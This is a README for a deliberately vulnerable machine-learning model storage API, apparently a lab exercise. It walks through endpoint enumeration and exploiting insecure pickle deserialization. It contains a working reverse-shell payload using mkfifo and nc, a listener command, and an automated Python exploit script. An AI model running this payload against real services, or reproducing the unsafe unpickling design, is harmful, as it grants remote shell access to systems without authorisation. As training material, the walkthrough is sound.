# Grocery
## Exploitable storage service API 
## Ross Clarke

## Setup 

### Single Host

The API can be hosted directly from any machine with python installed. First, be sure to install all the dependencies from the `requirements.txt` file.

From the root directory, run:

	pip3 install -r requirements.txt

Next, you can run the app using: 

	uvicorn main:app --reload

You should now see some startup logs, try connecting to the api from your terminal. Note: be sure to connect using the port specified in the startup logs. 

	curl localhost:8000 

You should see a welcome message returned. This lets you know the app is up and running. 

### Containerized Deployment

Whether you wish to use Kubernetes or another container managemnet solution, you can use the included Dockerfile to create a container image. Run `docker build . --no-cache -t grocery:latest` to build a fresh image that you can deploy wherever you wish. To deploy the container, run `docker run -p 8000:8000 grocery:latest`. 

## Exploit 

### Enumeration

Enumerating the API yeilds 5 endpoints. 

`/` : Root

`/info` : Info

`/user` : User 

`/models` : Model (submit)

`/models/{user}/{model_id}` : Model (fetch)

These endpoints expose some information about the service. Info describes that this is a service that can be leveraged as a "pastebin" service for machine learning models. However, when models are submitted the Model submit endpoint, you receive an "unauthenticated" message. The User endpoint shares a username and password string. If this combo is used, you can post data to the Model submit endpoint. However, not all data ends up giving back a valid 'modelId'. After enumerating the endpoint with different machine learning model formats, only the .pkl or "pickle" format returns a valid modelId (starting with id = 0). Now, you are able to retrieve your model with the Model fetch endpoint by providing the given modelId and credentials. 

### Exploit 

Since the Model submit endpoint only accepts valid pickled data, this may means the format of the pickled data is being checked somehow. In this instance, the data is being loaded into memory using the standard python pickle libary. Reading the documentation warns to not unpickle untrusted data. This is because the pickle library leverages a standard function called `reduce`. This function can be overwritten by the pickle object (serialized pickled data) to any arbitrary valid python code, and when the pickle object is deserialize (unpickled) that `reduce` function is used. In python, overwriting standard object functions can be done simply by defining a new reduce function as so:

	def __reduce__(self):
		# Some valid Python code

To exploit the API, you must implement some malicious logic in this python function. Below is an example of a reverse shell:

	def __reduce__(self):
		cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
			'/bin/sh -i 2>&1 | nc 127.0.0.1 1337 > /tmp/f')
		return os.system, (cmd,)

You can define any class with this function, instantiate it, and pickle it like so `pickle.dumps(YOUR_OBJ)` . Printing this will proudce a sequence of bytes, which can be passed in the body of the request to the Model submit endpoint. When the request is sent, the python code in `__reduce__` will run on the host and reach back out to the specified host on port `1337`. Be sure to be listening on that port for the reverse shell before sending the malicious request. 

Tip: run the following to listen for incoming connections:

	ncat -lv 1337

An automated exploit in python is provided below:

```
import pickle
import base64
import os
import requests

from requests.auth import HTTPBasicAuth

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1337 > /tmp/f')
        return os.system, (cmd,)


if __name__ == '__main__':
    url = 'API_IP_ADDRESS'
    
    ## Fetch credentials
    credsResp = requests.get(f'{url}/user')
    credsJson = credsResp.json()
    
    ## Send malicious model
    basic = HTTPBasicAuth(credsJson['username'], credsJson['password'])
    pickled = pickle.dumps(RCE())
    my_state_vectors = base64.urlsafe_b64encode(pickled)
    resp = requests.post(f'{url}/models', data=my_state_vectors, auth=basic)
    print(resp.content)
```

